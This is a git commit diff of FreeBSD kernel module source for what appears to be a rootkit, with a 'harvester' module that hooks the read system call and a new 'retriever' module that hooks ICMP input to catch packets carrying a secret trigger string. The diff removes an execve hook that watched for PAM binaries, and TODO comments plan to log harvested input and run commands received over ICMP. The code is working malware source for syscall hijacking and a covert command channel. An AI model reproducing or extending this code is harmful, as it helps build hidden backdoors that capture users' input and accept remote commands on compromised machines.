d5950832fabd4af9816ef2fd3325d30fc29fbc90
Hai Lang <freealson@gmail.com>
2013-02-28 18:11:19 +0800

    adding todos

--- module/harvester/harvester.c
+++ module/harvester/harvester.c
@@ -13,6 +13,8 @@
  *      2013-02-28
  *
  * TODO:
+ *      1. Make character device to store info
+ *      2. Make client app to retrieve info and save to log files
 */
 
 /* General Headers */
@@ -29,62 +31,15 @@
 #include <sys/syscall.h>
 #include <sys/stat.h>
 
-/* File Handling Headers */
-//#include <sys/fcntl.h>
-//#include <sys/file.h>
-//#include <sys/syslog.h>
-
-/* Headers For ICMP Hooking */
-#include <sys/mbuf.h>
-#include <sys/protosw.h>
-//#include <net/if.h>
-#include <netinet/in.h>
-#include <netinet/in_pcb.h>
-#include <netinet/ip_var.h>
-#include <netinet/tcp_var.h>
-#include <netinet/in_systm.h>
-#include <netinet/ip.h>
-#include <netinet/ip_icmp.h>
 
 /* Options */
 #define KERNDEBUG 1
-#define ICMP_TRIGGER "5L1C3R_TRIGGER"
-
-/* For ICMP Hooking */
-extern struct protosw inetsw[];
-pr_input_t icmp_input_hook;
 
 /* Harvester Implementation Function */
 static int harvester(struct thread *td, void *syscall_args)
 {
     uprintf("Harvester Module Loaded!\n");
     return (0);
-}
-
-/* icmp_input_hook - Reporting */
-void icmp_input_hook(struct mbuf *m, int off)
-{
-    struct icmp *icp;
-    int hlen = off;
-
-    /* Locate the ICMP message within m */
-    m->m_len -= hlen;
-    m->m_data += hlen;
-
-    /* Extract the ICMP message */
-    icp = mtod(m, struct icmp *);
-
-    /* Restore the message */
-    m->m_len += hlen;
-    m->m_data -= hlen;
-
-    /* Check if the message has the right trigger */
-    printf("Data Received: %s\n", icp->icmp_data);
-    if(strcmp(icp->icmp_data, ICMP_TRIGGER)) {
-        printf("ICMP Trigger Received!\n");
-    } else {
-        icmp_input(m, off);
-    }
 }
 
 /* read hook - get user input */
@@ -117,28 +72,6 @@ static int read_hook(struct thread *td, void *syscall_args)
     return (error);
 }
 
-/* Experimental PAM Hook */
-static int execve_hook(struct thread *td, void *syscall_args)
-{
-    struct execve_args /*{
-        const char *path;
-        char *const argv[];
-        char *const envp[];
-    }*/*args;
-    args = (struct execve_args *)syscall_args;
-
-    char path[NAME_MAX];
-    size_t copied;
-    if (copyinstr(args->fname, path, NAME_MAX, &copied) == EFAULT) {
-        return (EFAULT);
-    }
-
-    if(strstr(path, "pam")) {
-        uprintf("FOUND: %s\n", path);
-    }
-
-    return (sys_execve(td, syscall_args));
-}
 /*
  * ================System Call Config===================
  * =====================================================
@@ -163,16 +96,12 @@ static int load(struct module *module, int cmd, void *arg)
             uprintf("Harvester Module Loaded!\n");
             #endif
             sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
-            sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
-            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
             break;
         case MOD_UNLOAD:
             #if KERNDEBUG == 1
             uprintf("Harvester Module Unloaded\n");
             #endif
             sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
-            sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
-            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
             break;
         default:
             error = EOPNOTSUPP;
--- module/retriever/retriever.c
+++ module/retriever/retriever.c
@@ -13,6 +13,9 @@
  *      2013-02-28
  *
  * TODO:
+ *      1. Make character device to store received command
+ *      2. Make userland app to execute the command
+ *
  *
 */
 
@@ -22,3 +25,99 @@
 #include <sys/proc.h>
 #include <sys/module.h>
 #include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/sysproto.h>
+
+/* System Call Headers */
+#include <sys/syscall.h>
+#include <sys/stat.h>
+
+/* Headers For ICMP Hooking To Actively Sending Commands */
+#include <sys/mbuf.h>
+#include <sys/protosw.h>
+#include <netinet/in.h>
+#include <netinet/in_pcb.h>
+#include <netinet/ip_var.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+
+/* Options */
+#define KERNDEBUG 1
+#define ICMP_TRIGGER "5L1C3R_TRIGGER_"
+
+/* ICMP Hooking Config */
+extern struct protosw inetsw[];
+pr_input_t icmp_input_hook;
+
+/* Retriever Implementation Function */
+static int retriever(struct thread *td, void *syscall_args)
+{
+    uprintf("Whatever makes you happy, my master!\n");
+    return (0);
+}
+
+/* icmp_input_hook - Receive Injected ICMP Packets */
+void icmp_input_hook(struct mbuf *m, int off)
+{
+    struct icmp *icp;
+    int hlen = off;
+
+    /* Locate the ICMP message within m */
+    m->m_len -= hlen;
+    m->m_data += hlen;
+
+    /* Extract the ICMP message */
+    icp = mtod(m, struct icmp *);
+
+    /* Restore the message */
+    m->m_len += hlen;
+    m->m_data -= hlen;
+
+    /* Check if the message has the right trigger */
+    if(strstr(icp->icmp_data, ICMP_TRIGGER)) {
+        printf("ICMP TRIGGER Received!\n");
+    } else {
+        /* Call original icmp_input if there's nothing special about the packet */
+        icmp_input(m, off);
+    }
+}
+
+/* Prepare sysent to register the new system call */
+static struct sysent retriever_sysent = {
+    1, /* Number of arguments */
+    retriever /* Implementation Function */
+};
+
+/* Define the offset in sysent[] table */
+static int offset = NO_SYSCALL;
+
+/* Event Handler Function For The New System Call */
+static int load(struct module *module, int cmd, void *arg)
+{
+    int error = 0;
+
+    switch(cmd) {
+        case MOD_LOAD:
+            #if KERNDEBUG == 1
+            uprintf("Retriever Module Loaded!\n");
+            #endif
+            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
+            break;
+        case MOD_UNLOAD:
+            #if KERNDEBUG == 1
+            uprintf("Retriever Module Unloaded\n");
+            #endif
+            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+            break;
+        default:
+            error = EOPNOTSUPP;
+            break;
+    }
+
+    return (error);
+}
+
+/* Declare and register the system call module */
+SYSCALL_MODULE(retriever, &offset, &retriever_sysent, load, NULL);
